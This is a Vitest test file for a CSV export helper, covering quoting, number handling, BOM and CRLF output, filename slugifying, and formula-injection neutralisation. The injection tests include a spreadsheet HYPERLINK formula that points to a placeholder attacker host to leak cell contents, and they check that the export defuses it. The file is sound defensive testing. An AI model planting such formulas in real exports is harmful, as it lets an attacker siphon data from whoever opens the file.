import { describe, it, expect } from 'vitest';
import { csvCell, csvFilename, csvRow, toCsv, UTF8_BOM } from './csv';

describe('csvCell — quoting', () => {
  it('leaves ordinary text alone', () => {
    expect(csvCell('Prepare the pack')).toBe('Prepare the pack');
  });

  it('quotes a value containing a comma', () => {
    expect(csvCell('Reconcile fees, then file')).toBe('"Reconcile fees, then file"');
  });

  it('doubles embedded quotes', () => {
    expect(csvCell('He said "later"')).toBe('"He said ""later"""');
  });

  it('quotes values containing newlines', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
    expect(csvCell('line one\r\nline two')).toBe('"line one\r\nline two"');
  });

  it('renders empty for null and undefined', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('renders numbers unquoted so they arrive as numbers', () => {
    expect(csvCell(42)).toBe('42');
    expect(csvCell(66.7)).toBe('66.7');
    expect(csvCell(0)).toBe('0');
  });

  it('renders non-finite numbers as empty rather than the text NaN', () => {
    expect(csvCell(Number.NaN)).toBe('');
    expect(csvCell(Number.POSITIVE_INFINITY)).toBe('');
  });

  it('renders booleans as text', () => {
    expect(csvCell(true)).toBe('true');
    expect(csvCell(false)).toBe('false');
  });
});

describe('csvCell — formula injection', () => {
  // The attack: an employee names a ticket so the export becomes executable when
  // a colleague opens it in Excel.
  it.each([
    ['=1+1', "'=1+1"],
    ['=HYPERLINK("http://attacker/"&A1)', '"\'=HYPERLINK(""http://attacker/""&A1)"'],
    ['+1', "'+1"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tstarts with tab', "'\tstarts with tab"],
  ])('neutralises %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('does not mangle text that merely contains those characters later', () => {
    expect(csvCell('P1 = urgent')).toBe('P1 = urgent');
    expect(csvCell('cost-plus')).toBe('cost-plus');
  });

  it('still quotes a neutralised value that also needs quoting', () => {
    expect(csvCell('=a,b')).toBe('"\'=a,b"');
  });

  it('leaves a negative NUMBER alone — only strings are a formula risk', () => {
    // Prefixing a real number would turn a value into text in the spreadsheet.
    expect(csvCell(-5)).toBe('-5');
  });
});

describe('csvRow and toCsv', () => {
  it('joins cells with commas', () => {
    expect(csvRow(['a', 1, null, true])).toBe('a,1,,true');
  });

  it('starts with a UTF-8 BOM so Excel detects the encoding', () => {
    const out = toCsv(['a'], [['x']]);
    expect(out.startsWith(UTF8_BOM)).toBe(true);
  });

  it('uses CRLF line endings per RFC 4180 and ends with one', () => {
    const out = toCsv(['a', 'b'], [['1', '2'], ['3', '4']]);
    expect(out).toBe(`${UTF8_BOM}a,b\r\n1,2\r\n3,4\r\n`);
  });

  it('handles a header with no rows', () => {
    expect(toCsv(['a', 'b'], [])).toBe(`${UTF8_BOM}a,b\r\n`);
  });

  it('preserves non-ASCII text', () => {
    const out = toCsv(['name'], [['Priya Sharmā']]);
    expect(out).toContain('Priya Sharmā');
  });
});

describe('csvFilename', () => {
  it('slugifies and appends the date', () => {
    expect(csvFilename('Ticket report', '2026-08-17')).toBe('ticket-report-2026-08-17.csv');
  });

  it('strips characters that would break a Content-Disposition header', () => {
    expect(csvFilename('a/b\\c"d', '2026-08-17')).toBe('a-b-c-d-2026-08-17.csv');
  });

  it('collapses runs of separators', () => {
    expect(csvFilename('a   ---   b', '2026-08-17')).toBe('a-b-2026-08-17.csv');
  });
});
